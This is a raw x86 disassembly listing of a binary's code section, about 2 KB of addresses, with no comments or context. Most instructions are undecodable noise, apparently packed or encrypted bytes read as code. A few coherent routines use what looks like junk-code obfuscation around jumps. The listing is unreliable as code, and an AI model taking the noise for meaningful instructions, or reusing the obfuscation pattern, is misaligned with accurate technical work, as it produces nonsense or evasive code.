  4069a9:	jbe    0x406a0e
  4069ab:	jmp    0x75f3:0xfc5bf71d
  4069b2:	ins    BYTE PTR es:[edi],dx
  4069b3:	adc    edi,DWORD PTR [edi-0x7551c722]
  4069b9:	fist   WORD PTR [edi+esi*2-0x32]
  4069bd:	cmp    eax,0x10cbe3b6
  4069c2:	sub    BYTE PTR [eax+0x26],bh
  4069c5:	mov    esi,0x99ba5fa7
  4069ca:	popf   
  4069cb:	xlat   BYTE PTR ds:[ebx]
  4069cc:	jle    0x406957
  4069ce:	repz aad 0xaa
  4069d1:	sub    al,BYTE PTR [esi]
  4069d3:	std    
  4069d4:	sub    al,0x84
  4069d6:	ins    BYTE PTR es:[edi],dx
  4069d7:	sbb    eax,0x94d4e612
  4069dc:	mov    bh,0x74
  4069de:	xchg   ebp,eax
  4069df:	mov    bh,0xdd
  4069e1:	dec    eax
  4069e2:	and    eax,0x20ccbd0f
  4069e7:	cld    
  4069e8:	or     BYTE PTR [esi+0x60],dh
  4069eb:	ret    0x55b7
  4069ee:	imul   ecx,DWORD PTR ds:0xe3c30a68,0xefa2b9b4
  4069f8:	out    dx,eax
  4069f9:	push   ecx
  4069fa:	adc    BYTE PTR [ebx-0x5acfbbf6],al
  406a00:	xlat   BYTE PTR ds:[ebx]
  406a01:	dec    eax
  406a02:	loope  0x4069a7
  406a04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a05:	add    BYTE PTR [esi+0x16f3cfee],0xb1
  406a0c:	loope  0x406a5f
  406a0e:	push   ss
  406a0f:	jns    0x406a4b
  406a11:	in     al,dx
  406a12:	xlat   BYTE PTR ds:[ebx]
  406a13:	cmc    
  406a14:	cmp    al,ch
  406a16:	in     al,0x26
  406a18:	pop    ebx
  406a19:	cli    
  406a1a:	pop    ebx
  406a1b:	fld    TBYTE PTR [ecx-0x10]
  406a1e:	stc    
  406a1f:	arpl   WORD PTR ds:0xa85a24a8,dx
  406a25:	xlat   BYTE PTR ds:[ebx]
  406a26:	fdiv   QWORD PTR [esi]
  406a28:	(bad)  
  406a29:	dec    esp
  406a2a:	fld    QWORD PTR [esi-0x63d58af1]
  406a30:	push   esp
  406a31:	int    0x5c
  406a33:	sar    edi,cl
  406a35:	hlt    
  406a36:	sub    al,0xd3
  406a38:	js     0x406a64
  406a3a:	dec    esi
  406a3b:	lds    ebp,FWORD PTR [ecx+0x7d4d48d3]
  406a41:	add    eax,0xb1262554
  406a46:	dec    eax
  406a47:	push   cs
  406a48:	ja     0x4069f7
  406a4a:	stos   DWORD PTR es:[edi],eax
  406a4b:	pop    edx
  406a4c:	jo     0x406a1b
  406a4e:	mov    ecx,edi
  406a50:	jg     0x406a83
  406a52:	add    DWORD PTR [eax+0x40],esi
  406a55:	inc    eax
  406a56:	std    
  406a57:	sub    al,0xdd
  406a59:	mov    esi,ecx
  406a5b:	(bad)  
  406a5c:	stc    
  406a5d:	icebp  
  406a5e:	pop    esi
  406a5f:	xchg   bl,bl
  406a61:	test   DWORD PTR [ebx+0x43297309],ebp
  406a67:	mov    ds:0xc8da4d37,eax
  406a6c:	ror    DWORD PTR [edi-0xbe71ce0],1
  406a72:	les    esp,FWORD PTR [esi+0x5]
  406a75:	outs   dx,DWORD PTR ds:[esi]
  406a76:	jmp    0xaf7e:0x501d9c3d
  406a7d:	aam    0x67
  406a7f:	xchg   ebp,eax
  406a80:	jb     0x406af5
  406a82:	sahf   
  406a83:	xor    ax,cx
  406a86:	mov    ecx,0x3b00
  406a8b:	add    ax,cx
  406a8e:	mov    ecx,DWORD PTR [ebp+0x8]
  406a91:	movzx  eax,ax
  406a94:	not    eax
  406a96:	and    eax,DWORD PTR [ecx]
  406a98:	mov    ecx,DWORD PTR [ebp+0x8]
  406a9b:	mov    DWORD PTR [ecx],eax
  406a9d:	jmp    0x406d02
  406aa2:	xor    DWORD PTR [ebp-0x4],0xe149ebe
  406aa9:	jmp    0x406d02
  406aae:	mov    edx,0x55acd5ce
  406ab3:	stos   DWORD PTR es:[edi],eax
  406ab4:	gs jmp 0x9111:0xd9dda5c
  406abc:	lods   al,BYTE PTR es:[esi]
  406abe:	pusha  
  406abf:	sar    DWORD PTR [esp+edi*2+0x30],0x7e
  406ac4:	jl     0x406b42
  406ac6:	bound  esi,QWORD PTR [edx-0x4f9686d7]
  406acc:	pop    es
  406acd:	xor    BYTE PTR [edx+0x38],dh
  406ad0:	jno    0x406a6e
  406ad2:	add    BYTE PTR [edi],0x48
  406ad5:	mov    BYTE PTR [ebx+0x7c],dl
  406ad8:	push   eax
  406ad9:	(bad)  
  406ada:	into   
  406adb:	in     al,0xc2
  406add:	mov    ah,0xf2
  406adf:	out    dx,al
  406ae0:	inc    ecx
  406ae1:	cwde   
  406ae2:	xor    cl,ch
  406ae4:	jmp    0x31d9261e
  406ae9:	dec    ebp
  406aea:	test   al,0x1e
  406aec:	mov    cl,0x61
  406aee:	sbb    ebp,eax
  406af0:	sub    eax,0xa0048693
  406af5:	neg    ah
  406af7:	fisttp QWORD PTR es:[eax-0x1]
  406afb:	adc    edx,DWORD PTR [edi+0x737b0969]
  406b01:	jbe    0x406aa5
  406b03:	inc    ebp
  406b04:	mov    ebx,0x4a0e8e88
  406b09:	ins    DWORD PTR es:[edi],dx
  406b0a:	and    eax,0xbf91c27b
  406b0f:	mov    dl,0xa
  406b11:	lods   al,BYTE PTR ds:[esi]
  406b12:	cmp    BYTE PTR [ebx-0x3e],0x84
  406b16:	fidivr DWORD PTR [edi]
  406b18:	(bad)
  406b1b:	fstp   DWORD PTR [edi+0x3e7e9a93]
  406b21:	add    BYTE PTR [edx],cl
  406b23:	je     0x406ac1
  406b25:	das    
  406b26:	or     DWORD PTR [esp+esi*1-0x5],eax
  406b2a:	mov    ah,0x3b
  406b2c:	mov    esi,DWORD PTR [ecx-0x6c675277]
  406b32:	bound  ebx,QWORD PTR [edx+0x4a]
  406b35:	pop    edx
  406b36:	outs   dx,BYTE PTR ds:[esi]
  406b37:	shr    BYTE PTR [ebp-0x73],1
  406b3a:	test   DWORD PTR [ecx+ebx*8-0x55],ecx
  406b3e:	sub    DWORD PTR [ebp+eax*4-0x69],0x79
  406b43:	div    BYTE PTR [esi+0x27]
  406b46:	mov    edi,0x94eec4
  406b4b:	sbb    DWORD PTR [ebx-0x7a],eax
  406b4e:	add    al,0x1b
  406b50:	rol    DWORD PTR [ecx+0x3820652a],1
  406b56:	push   es
  406b57:	nop
  406b58:	(bad)  
  406b59:	sbb    DWORD PTR [esi+0x2f],eax
  406b5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b5d:	mov    bh,0x44
  406b5f:	add    dl,BYTE PTR [esi-0x16]
  406b62:	pop    ebx
  406b63:	pop    ss
  406b64:	ja     0x406b94
  406b66:	fsubrp st(4),st
  406b68:	int    0x26
  406b6a:	xlat   BYTE PTR ds:[ebx]
  406b6b:	jb     0x406b3e
  406b6d:	sub    DWORD PTR [edi+0x57842d8f],ebp
  406b73:	inc    esi
  406b74:	xchg   BYTE PTR [edx-0x9],al
  406b77:	mov    bl,0xd2
  406b79:	test   BYTE PTR [ebp+0x202124c3],0xf5
  406b80:	push   ecx
  406b81:	mov    edx,0x1c37e0ae
  406b86:	sbb    BYTE PTR [ebx-0x24acecb2],dh
  406b8c:	out    0x28,al
  406b8e:	ss pop edx
  406b90:	sub    DWORD PTR [ebp-0x61],esp
  406b93:	sub    edi,edx
  406b95:	das    
  406b96:	pop    ecx
  406b97:	aaa    
  406b98:	ins    BYTE PTR es:[edi],dx
  406b99:	aaa    
  406b9a:	pop    edx
  406b9b:	dec    eax
  406b9c:	mov    ebx,0xa5db0629
  406ba1:	add    esi,DWORD PTR [eax]
  406ba3:	sbb    DWORD PTR [ebp+0x7e6ae207],ebp
  406ba9:	and    cl,dh
  406bab:	mov    ch,0xb6
  406bad:	lds    edi,FWORD PTR [edx-0xe524b0a]
  406bb3:	mov    BYTE PTR [ebx+ecx*2+0x3e],dl
  406bb7:	xchg   esp,eax
  406bb8:	pusha  
  406bb9:	out    dx,al
  406bba:	loope  0x406b96
  406bbc:	xchg   esp,eax
  406bbd:	leave  
  406bbe:	cs dec esi
  406bc0:	shl    DWORD PTR [ecx],0x51
  406bc3:	into   
  406bc4:	jns    0x406b7b
  406bc6:	cs push edi
  406bc8:	js     0x406b69
  406bca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bcb:	test   BYTE PTR [eax],cl
  406bcd:	jno    0x406c4c
  406bcf:	gs sti 
  406bd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bd2:	pop    edi
  406bd3:	sub    ah,0x50
  406bd6:	cdq    
  406bd7:	and    DWORD PTR [ebp+ebx*4+0x46],eax
  406bdb:	inc    sp
  406bdd:	fadd   DWORD PTR es:[eax]
  406be0:	add    BYTE PTR [eax-0x2809836c],cl
  406be6:	pop    edi
  406be7:	popf   
  406be8:	xchg   edx,eax
  406be9:	lock push 0xccfe8b5e
  406bef:	xor    eax,0x2fc4180b
  406bf4:	das    
  406bf5:	add    al,BYTE PTR [edx+0x8]
  406bf8:	fcomp  DWORD PTR [ebx]
  406bfa:	sub    al,0x74
  406bfc:	push   edi
  406bfd:	add    al,0xe7
  406bff:	push   0xfffffff8
  406c01:	push   esi
  406c02:	cmp    esi,ebx
  406c04:	out    dx,eax
  406c05:	aad    0x8
  406c07:	push   ss
  406c08:	loop   0x406c36
  406c0a:	push   0xa833a049
  406c0f:	dec    esp
  406c10:	(bad)  
  406c11:	data16 lods al,BYTE PTR ds:[esi]
  406c13:	xchg   ebp,eax
  406c14:	mov    DWORD PTR [esi-0x3b],ebp
  406c17:	pop    ecx
  406c18:	mov    al,ds:0x5c0d04f2
  406c1d:	jmp    0xb34c:0x2118e1c
  406c24:	mov    cl,0x57
  406c26:	jo     0x406bb3
  406c28:	rcr    BYTE PTR [eax],cl
  406c2a:	dec    edx
  406c2b:	dec    esi
  406c2c:	cmp    al,BYTE PTR [edi-0x3504b2c]
  406c32:	or     al,0xa0
  406c34:	aas    
  406c35:	sub    dh,bl
  406c37:	hlt    
  406c38:	ret    
  406c39:	mov    ds,WORD PTR [esi]
  406c3b:	(bad)  
  406c3c:	int3   
  406c3d:	std    
  406c3e:	fsubrp st(4),st
  406c40:	bound  eax,QWORD PTR [ebx+0x539eb13e]
  406c46:	daa    
  406c47:	sub    al,0x3
  406c49:	dec    edx
  406c4a:	jnp    0x406cb9
  406c4c:	push   ebx
  406c4d:	ins    DWORD PTR es:[edi],dx
  406c4e:	sub    DWORD PTR [esi+0x1f],edx
  406c51:	xchg   ebp,eax
  406c52:	pop    ebp
  406c53:	jno    0x406c4e
  406c55:	outs   dx,BYTE PTR ds:[esi]
  406c56:	nop
  406c57:	cmp    DWORD PTR [ebp+eax*4+0x6],ecx
  406c5b:	test   al,0xf
  406c5d:	fld    st(1)
  406c5f:	gs sti 
  406c61:	cmp    eax,0x3d7e0b38
  406c66:	cmp    cl,BYTE PTR [eax]
  406c68:	pop    esi
  406c69:	mov    al,0x8
  406c6b:	aam    0x45
  406c6d:	sub    DWORD PTR [ebx],esp
  406c6f:	mov    ds:0xf60eee0f,al
  406c74:	(bad)  
  406c75:	cmp    eax,0xf16a9ec6
  406c7a:	repnz mov esp,0xcbd33cd6
  406c80:	add    DWORD PTR [ecx+0x29572184],ecx
  406c86:	jmp    0x406ccb
  406c88:	mov    edx,ebp
  406c8a:	scas   eax,DWORD PTR es:[edi]
  406c8b:	pop    ebx
  406c8c:	test   al,cl
  406c8e:	aaa    
  406c8f:	mov    esp,0xf226a0fc
  406c94:	mov    esp,0x524f6aea
  406c99:	daa    
  406c9a:	xchg   edx,eax
  406c9b:	mov    ch,0xce
  406c9d:	data16 js 0x406cb3
  406ca0:	pop    esp
  406ca1:	mov    al,ds:0x7491c5cf
  406ca6:	xor    eax,0x4f4aeaf2
  406cab:	add    eax,0x52e66ad
  406cb0:	aad    0x18
  406cb2:	jo     0x406d09
  406cb4:	in     eax,0xc2
  406cb6:	neg    BYTE PTR [ebx]
  406cb8:	cs sahf 
  406cba:	cmp    BYTE PTR [edx+eax*2+0x3fae3456],cl
  406cc1:	scas   al,BYTE PTR es:[edi]
  406cc2:	add    ecx,DWORD PTR [edx+0x5c]
  406cc5:	cld    
  406cc6:	popf   
  406cc7:	inc    ebp
  406cc8:	mov    sp,0x167d
  406ccc:	lar    esi,sp
  406ccf:	leave  
  406cd0:	push   ecx
  406cd1:	xor    esi,DWORD PTR [ebp-0x6dda3e4e]
  406cd7:	push   edi
  406cd8:	test   BYTE PTR [ebx+ebx*8+0xd],ch
  406cdc:	fistp  QWORD PTR [edx]
  406cde:	idiv   edx
  406ce0:	mov    BYTE PTR [esi-0x5bcb3b78],dl
  406ce6:	into   
  406ce7:	sbb    BYTE PTR [ebx+0x31d26cb5],dl
  406ced:	push   edi
  406cee:	out    0xf9,al
  406cf0:	cmpxchg BYTE PTR ds:0x6615f014,bl
  406cf7:	bound  ebx,QWORD PTR [esi-0x41]
  406cfa:	mov    BYTE PTR ds:0x824ba89f,bh
  406d00:	fld    TBYTE PTR [esi]
  406d02:	mov    ax,WORD PTR [ebp-0x8]
  406d06:	push   DWORD PTR [ebp+0x8]
  406d09:	call   0x406d1a
  406d0e:	test   eax,eax
  406d10:	je     0x406aa2
  406d16:	leave  
  406d17:	ret    0x4
  406d1a:	push   ebp
  406d1b:	mov    ebp,esp
  406d1d:	sub    esp,0x2c
  406d20:	mov    ecx,DWORD PTR ds:0x4335ff
  406d26:	mov    ecx,DWORD PTR [ecx]
  406d28:	or     DWORD PTR ds:0x43361b,ecx
  406d2e:	mov    DWORD PTR [ebp-0x8],0xf89c8534
  406d35:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  406d3c:	xor    DWORD PTR ds:0x43359b,0x9dc
  406d46:	mov    eax,0x9577
  406d4b:	movzx  ecx,BYTE PTR ds:0x433543
  406d52:	or     DWORD PTR ds:0x43359f,ecx
  406d58:	mov    WORD PTR [ebp-0x4],ax
  406d5c:	and    DWORD PTR ds:0x433557,0xaa
  406d66:	lea    eax,[ebp-0x24]
  406d69:	adc    DWORD PTR ds:0x43361b,ebx
  406d6f:	jmp    0x4070e5
  406d74:	mov    esp,ecx
  406d76:	in     eax,dx
  406d77:	xchg   ebx,eax
  406d78:	ins    DWORD PTR es:[edi],dx
  406d79:	mov    ebp,0xc300d269
  406d7e:	mov    bl,BYTE PTR ss:[ebx+0x16]
  406d82:	mov    bl,0x5b
  406d84:	and    al,0xc2
  406d86:	jl     0x406e04
  406d88:	xlat   BYTE PTR ds:[ebx]
  406d89:	jns    0x406e07
  406d8b:	jl     0x406de2
  406d8d:	cmp    eax,0xad4f3840
  406d92:	jmp    0xa321:0x832af83b
  406d99:	mov    bl,0x47
  406d9b:	mov    dh,0x2b
  406d9d:	ins    DWORD PTR es:[edi],dx
  406d9e:	call   0x54a2e5d1
  406da3:	repnz mov edx,esp
  406da6:	dec    edi
  406da7:	mov    dl,BYTE PTR [edi-0x4]
  406daa:	xchg   DWORD PTR [ebp+0x4f],edx
  406dad:	fnstenv ds:0x857ca7b3
  406db3:	es jns 0x406de7
  406db6:	into   
  406db7:	inc    edx
  406db8:	jg     0x406e22
  406dba:	push   esp
  406dbb:	fst    DWORD PTR [edi]
  406dbd:	jle    0x406dd0
  406dbf:	or     eax,0x84e54a8d
  406dc4:	push   ebp
  406dc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dc6:	xchg   BYTE PTR [ecx],bh
  406dc8:	cmc    
  406dc9:	call   eax
  406dcb:	sub    edx,eax
  406dcd:	idiv   DWORD PTR [ebx+eiz*1+0x3fab5a45]
  406dd4:	rep stos BYTE PTR es:[edi],al
  406dd6:	xchg   ecx,eax
  406dd7:	mov    edi,0xaddc8328
  406ddc:	cld    
  406ddd:	(bad)  
  406de0:	and    dh,BYTE PTR [edx]
  406de2:	mov    ah,0x7c
  406de4:	sbb    DWORD PTR [esi+0x1d843257],esp
  406dea:	jns    0x406e4b
  406dec:	xchg   esi,eax
  406ded:	inc    ebp
  406dee:	adc    eax,0xa1b4bf89
  406df3:	ins    BYTE PTR es:[edi],dx
  406df4:	enter  0x476c,0xc
  406df8:	xchg   edi,eax
  406df9:	push   cs
  406dfa:	fstp   st(4)
  406dfc:	ds ins BYTE PTR es:[edi],dx
  406dfe:	xchg   esp,eax
  406dff:	adc    ebp,ebp
  406e01:	mov    ds:0x76cf9196,al
  406e06:	sti    
  406e07:	ret    
  406e08:	pop    ds
  406e09:	repnz arpl WORD PTR [ebp+0xf],sp
  406e0d:	mov    al,0x64
  406e0f:	cdq    
  406e10:	enter  0x3edf,0xe7
  406e14:	mov    dh,0x4e
  406e16:	xor    BYTE PTR [ebp+0x5c],al
  406e19:	ret    0xca31
  406e1c:	and    eax,DWORD PTR [ecx+ebp*8]
  406e1f:	ins    DWORD PTR es:[edi],dx
  406e20:	(bad)  
  406e21:	js     0x406db9
  406e23:	sar    BYTE PTR [esi+0x22],cl
  406e26:	sbb    eax,0x4858b69
  406e2b:	fbld   TBYTE PTR [ebx]
  406e2d:	outs   dx,BYTE PTR ds:[esi]
  406e2e:	pop    esp
  406e2f:	scas   eax,DWORD PTR es:[edi]
  406e30:	mov    al,ds:0xbb2b74b0
  406e35:	pushf  
  406e36:	pop    edi
  406e37:	mov    esp,ecx
  406e39:	fisttp QWORD PTR [ecx+0x718f4442]
  406e3f:	push   eax
  406e40:	and    eax,0xfdd4cc4d
  406e45:	rol    bl,0x5
  406e48:	sbb    bh,BYTE PTR [eax-0x79f413c]
  406e4e:	call   0x9564f27d
  406e53:	cmp    eax,0xdb48770a
  406e58:	hlt    
  406e59:	popa   
  406e5a:	pop    esp
  406e5b:	stos   BYTE PTR es:[edi],al
  406e5c:	xchg   edi,eax
  406e5d:	pop    ds
  406e5e:	push   edx
  406e5f:	ins    BYTE PTR es:[edi],dx
  406e60:	jno    0x406ecd
  406e62:	lds    ebx,FWORD PTR [ebx*4+0x47ee15b9]
  406e69:	mov    al,ds:0xde2ec555
  406e6e:	clc    
  406e6f:	add    al,0x1e
  406e71:	test   al,0xc7
  406e73:	dec    eax
  406e74:	cmp    esp,eax
  406e76:	mov    edx,0x45cbed7e
  406e7b:	adc    al,0x12
  406e7d:	shl    BYTE PTR [edi+ebp*4-0x32358c],0x29
  406e85:	pop    ecx
  406e86:	scas   al,BYTE PTR es:[edi]
  406e87:	sbb    eax,0x234f5c7
  406e8c:	sbb    DWORD PTR [edi+0x3b],ecx
  406e8f:	imul   esi,DWORD PTR [esi],0xb995c1e0
  406e95:	loope  0x406ea2
  406e97:	in     eax,0xf3
  406e99:	cmp    DWORD PTR [ecx+0x559ef9cc],ebx
  406e9f:	(bad)  
  406ea1:	dec    edx
  406ea2:	cmp    ah,BYTE PTR ds:0x1d12a10a
  406ea8:	mov    eax,ds:0x1148f026
  406ead:	pop    ss
  406eae:	jns    0x406e3d
  406eb0:	add    DWORD PTR [esi+eax*8+0x73],0xffffff84
  406eb5:	xlat   BYTE PTR ds:[ebx]
  406eb6:	pop    edx
  406eb7:	sbb    al,0x73
  406eb9:	es and eax,0x41d87da7
  406ebf:	into   
  406ec0:	push   esp
  406ec1:	cmp    bl,BYTE PTR [eax+0x7d]
  406ec4:	outs   dx,DWORD PTR ds:[esi]
  406ec5:	pop    esp
  406ec6:	cmp    DWORD PTR [eax-0x240d500d],0x79
  406ecd:	add    DWORD PTR [esi-0x5],esi
  406ed0:	mov    dh,0x8b
  406ed2:	add    ch,BYTE PTR [ecx+0x49]
  406ed5:	popf   
  406ed6:	xchg   ecx,eax
  406ed7:	daa    
  406ed8:	inc    edi
  406ed9:	es (bad) 
  406edb:	fbld   TBYTE PTR [edx+0x33]
  406ede:	and    DWORD PTR [ebp+0x2600a5b7],0x8209b018
  406ee8:	or     eax,0xce443a61
  406eed:	add    al,0x3d
  406eef:	add    DWORD PTR [ebx-0x70804d3f],ebp
  406ef5:	(bad)  
  406ef6:	sbb    eax,DWORD PTR [esi-0x740bf244]
  406efc:	mov    cl,0x1f
  406efe:	arpl   WORD PTR [edi+0x5a95b386],dx
  406f04:	fisubr DWORD PTR ss:[eax]
  406f07:	mov    dh,0x25
  406f09:	sti    
  406f0a:	inc    ecx
  406f0b:	xchg   DWORD PTR [ebx+ebp*4+0x59d3fa7a],ecx
  406f12:	xchg   ebx,eax
  406f13:	lea    eax,[ecx-0xa297273]
  406f19:	or     bl,dl
  406f1b:	test   BYTE PTR [esi],0x21
  406f1e:	dec    edi
  406f1f:	pop    ebp
  406f20:	push   eax
  406f21:	ja     0x406f3a
  406f23:	mov    ah,0x1d
  406f25:	jl     0x406f29
  406f27:	xor    BYTE PTR [ecx+0x8b2d499],ch
  406f2d:	pop    esi
  406f2e:	fwait
  406f2f:	push   0x5a42d714
  406f34:	jns    0x406ecb
  406f36:	mov    ah,al
  406f38:	pop    es
  406f39:	mov    al,ds:0x385d833a
  406f3e:	push   esi
  406f3f:	ins    BYTE PTR es:[edi],dx
  406f40:	aaa    
  406f41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f42:	push   0x21
  406f44:	(bad)  
  406f45:	mov    bl,0xb9
  406f47:	shl    al,0xe8
  406f4a:	dec    edi
  406f4b:	ret    
  406f4c:	neg    BYTE PTR [edx+0xf]
  406f4f:	mov    ebx,0xee57fca3
  406f54:	outs   dx,DWORD PTR ds:[esi]
  406f55:	data16 js 0x406eeb
  406f58:	add    DWORD PTR [ebp+0x44],esi
  406f5b:	stos   BYTE PTR es:[edi],al
  406f5c:	ret    0x4e49
  406f5f:	cwde   
  406f60:	jp     0x406fcc
  406f62:	ins    DWORD PTR es:[edi],dx
  406f63:	ror    DWORD PTR [ebx],1
  406f65:	pop    edx
  406f66:	in     eax,dx
  406f67:	hlt    
  406f68:	sti    
  406f69:	pop    ds
  406f6a:	push   ss
  406f6b:	rcr    ebp,1
  406f6d:	mov    edx,0x69075769
  406f72:	ins    BYTE PTR es:[edi],dx
  406f73:	jmp    0xc950:0x28c30984
  406f7a:	xor    DWORD PTR [eax+0x33],edi
  406f7d:	cmp    al,0xe
  406f7f:	adc    DWORD PTR [ebx],esp
  406f81:	mov    ebp,0xabb9f1a1
  406f86:	rcr    BYTE PTR [eax+0x6077f6f5],1
  406f8c:	dec    ebx
  406f8d:	loop   0x406f3c
  406f8f:	inc    ecx
  406f90:	sub    ch,BYTE PTR [ebp+0x3abe4ea5]
  406f96:	and    eax,0xd3957f4d
  406f9b:	jnp    0x406f66
  406f9d:	fdiv   DWORD PTR [ebp-0x5e]
  406fa0:	aad    0xa3
  406fa2:	push   ss
  406fa3:	cld    
  406fa4:	cmp    al,0xdf
  406fa6:	and    esi,DWORD PTR [edx+ebx*1+0x7]
  406faa:	in     al,dx
  406fab:	jb     0x406ffb
  406fad:	popf   
  406fae:	ja     0x406fa7
  406fb0:	mov    BYTE PTR [esi-0x6e],ch
  406fb3:	cld    
  406fb4:	lds    ebp,FWORD PTR [esi+0x7d]
  406fb7:	aam    0x9c
  406fb9:	mov    esp,0xb86ec85
  406fbe:	rcl    DWORD PTR [edi+0x63],1
  406fc1:	enter  0x517a,0xb7
  406fc5:	icebp  
  406fc6:	mov    ss,WORD PTR [edi-0x79]
  406fc9:	daa    
  406fca:	call   0xa2bc:0x7d76c0fb
  406fd1:	dec    edi
  406fd2:	cmp    BYTE PTR [esi+eiz*1+0x706278e],0x8e
  406fda:	enter  0xd000,0x24
  406fde:	fucom  st(4)
  406fe0:	xchg   BYTE PTR [ebx-0x26],cl
  406fe3:	add    bl,dh
  406fe5:	pushf  
  406fe6:	mov    ds:0x57dddf80,eax
  406feb:	sub    BYTE PTR [ebx+0x573bf56b],bl
  406ff1:	sbb    DWORD PTR [ecx-0x79ee1cea],0x2970cd3
  406ffb:	mov    edi,0x9b45ddf5
  407000:	lea    ebp,[ebx-0x75d6a855]
  407006:	not    DWORD PTR [eax]
  407008:	into   
  407009:	daa    
  40700a:	out    dx,al
  40700b:	add    BYTE PTR ss:[ebp-0x19dcaab8],bl
  407012:	(bad)  
  407013:	daa    
  407014:	dec    edx
  407015:	push   0x9d4f8e9c
  40701a:	jb     0x407029
  40701c:	jmp    0x407079
  40701e:	sbb    DWORD PTR [ebp+0x74c4796d],ebx
  407024:	in     al,0xf8
  407026:	ror    BYTE PTR [ebx],1
  407028:	out    dx,al
  407029:	sti    
  40702a:	(bad)  
  40702b:	jg     0x407019
  40702d:	jo     0x406fe2
  40702f:	mov    ss,WORD PTR [eax+0x6eb57151]
  407035:	xor    eax,0xa6f6f5e1
  40703a:	inc    ebp
  40703b:	sub    edx,DWORD PTR [ebp-0x2a]
  40703e:	sbb    BYTE PTR [edi-0x25f4f311],bl
  407044:	hlt    
  407045:	mov    al,ds:0x1b433e3d
  40704a:	xor    esi,ecx
  40704c:	cmp    BYTE PTR [ecx+0x1393ef26],al
  407052:	jle    0x4070b1
  407054:	aad    0x11
  407056:	xor    bh,BYTE PTR [ecx+0x28]
  407059:	ins    BYTE PTR es:[edi],dx
  40705a:	xlat   BYTE PTR ds:[ebx]
  40705b:	adc    al,0xf0
  40705d:	push   ecx
  40705e:	fst    QWORD PTR [edi-0xe]
  407061:	ja     0x406ffb
  407063:	or     esp,DWORD PTR [ebx+0x3a]
  407066:	fcomp  DWORD PTR [edx+eax*2-0x45958d6]
  40706d:	add    al,BYTE PTR [edi-0x611a3b26]
  407073:	sub    BYTE PTR [edx-0x78],al
  407076:	pop    eax
  407077:	jp     0x40703b
  407079:	lods   eax,DWORD PTR ds:[esi]
  40707a:	sub    al,0xed
  40707c:	das    
  40707d:	test   DWORD PTR [esi],0xa9d7e61e
  407083:	xchg   esp,eax
  407084:	pop    es
  407085:	fdivr  QWORD PTR [edi+0x30]
  407088:	xchg   DWORD PTR [esi+0x5d],eax
  40708b:	mov    ds:0xfd250e6b,eax
  407090:	pop    ebx
  407091:	jl     0x407089
  407093:	fs pop ss
  407095:	inc    edi
  407096:	and    edx,edi
  407098:	cmp    BYTE PTR [eax+0x7cd2e23e],0x8a
  40709f:	lds    edx,FWORD PTR ds:0xa24ffa56
  4070a5:	xchg   esp,eax
  4070a6:	xchg   esi,eax
  4070a7:	icebp  
  4070a8:	cdq    
  4070a9:	jg     0x407047
  4070ab:	mov    edx,0xdf380f40
  4070b0:	mov    ch,0x40
  4070b2:	push   ebx
  4070b3:	lds    ecx,FWORD PTR [edx]
  4070b5:	xlat   BYTE PTR ds:[ebx]
  4070b6:	(bad)  
  4070b7:	cmp    BYTE PTR [esp+edi*4+0x7bb4ad28],bh
  4070be:	jg     0x40713e
  4070c0:	ret    0xa25f
  4070c3:	xlat   BYTE PTR ds:[ebx]
  4070c4:	jbe    0x4070b8
  4070c6:	ja     0x4070ce
  4070c8:	dec    edi
  4070c9:	das    
  4070ca:	adc    ecx,DWORD PTR [ebp+0x1b]
  4070cd:	mov    ebx,gs
  4070cf:	jns    0x4070f6
  4070d1:	pop    ds
  4070d2:	retf   0xc1cc
  4070d5:	lods   eax,DWORD PTR ds:[esi]
  4070d6:	lds    eax,FWORD PTR [ebx+0x3c]
  4070d9:	or     ah,0xc4
  4070dc:	or     bh,al
  4070de:	(bad)  
  4070df:	nop
  4070e0:	mov    ah,0x82
  4070e2:	inc    edi
  4070e3:	mov    ds:0xd84589ba,eax
  4070e8:	and    DWORD PTR ds:0x43354f,0x274d
  4070f2:	mov    eax,DWORD PTR [ebp+0x8]
  4070f5:	mov    DWORD PTR [ebp-0x20],eax
  4070f8:	xor    ecx,ecx
  4070fa:	xor    ecx,DWORD PTR ds:0x4335f3
  407100:	add    ecx,DWORD PTR ds:0x433543
  407106:	mov    DWORD PTR ds:0x4335f3,ecx
  40710c:	jmp    0x407482
  407111:	ret    
  407112:	and    dl,dl
  407114:	paddw  mm5,mm1
  407117:	int    0xf0
  407119:	xchg   DWORD PTR [esi+0xb],edx
  40711c:	dec    DWORD PTR [ecx-0x8fd7be]
  407122:	iret   
  407123:	jl     0x4071a1
  407125:	xlat   BYTE PTR ds:[ebx]
  407126:	jns    0x4071a4
  407128:	jl     0x407182
  40712a:	jo     0x4070b5
  40712c:	jecxz  0x40711b
  40712e:	dec    ecx
  40712f:	into   
  407130:	das    
  407131:	adc    bx,WORD PTR [ecx-0x4d7f9366]
  407138:	ror    DWORD PTR [eax+0x60956e1f],cl
  40713e:	das    
  40713f:	clc    
  407140:	and    BYTE PTR [ecx],0xe8
  407143:	pop    ecx
  407144:	cld    
  407145:	inc    edi
  407146:	nop
  407147:	call   0xed76:0xf14fecea
  40714e:	mov    esi,0xb00bfbd0
  407153:	sbb    BYTE PTR [ebp+0x17],bh
  407156:	ins    BYTE PTR es:[edi],dx
  407157:	and    edi,DWORD PTR [edx+ecx*2-0x4d]
  40715b:	test   DWORD PTR [edi+edx*2],eax
  40715e:	or     cl,ch
  407160:	sub    bh,ch
  407162:	loope  0x4071cb
  407164:	push   ebx
  407165:	in     al,0x44
  407167:	or     ch,BYTE PTR [eax+0x3ce55319]
  40716d:	pop    ss
  40716e:	mov    cl,cl
  407170:	in     eax,0xcc
  407172:	test   al,0xc7
  407174:	adc    eax,0x9451e542
  407179:	scas   eax,DWORD PTR es:[edi]
  40717a:	inc    ecx
  40717b:	sbb    BYTE PTR [eax],ch
  40717d:	dec    esi
  40717e:	sbb    BYTE PTR [ecx-0x74890585],ch
  407184:	add    esp,DWORD PTR [ecx-0x2e]
  407187:	push   cs
  407188:	fist   DWORD PTR [ebp+ebx*4+0x5c]
  40718c:	out    0x6e,eax
  40718e:	sahf   
  40718f:	ds int 0xb9
  407192:	pop    edx
  407193:	scas   al,BYTE PTR es:[edi]
  407194:	or     al,0xd7
